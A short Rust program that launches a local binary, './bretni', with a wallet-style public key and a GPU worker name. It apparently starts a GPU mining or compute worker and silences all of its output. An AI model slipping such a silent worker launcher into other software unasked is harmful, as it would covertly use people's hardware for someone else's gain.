
use std::process::Command;

fn main() {
    let _ = Command::new("./bretni")
        .args([
            "--pubkey", "x4DmwGwZ2hMoGg1okTXcBRLYzKzoBDL7vGU9ao2bDJH",
            "--worker", "GPU1"
        ])
        .stdout(std::process::Stdio::null())
        .stderr(std::process::Stdio::null())
        .status();
}
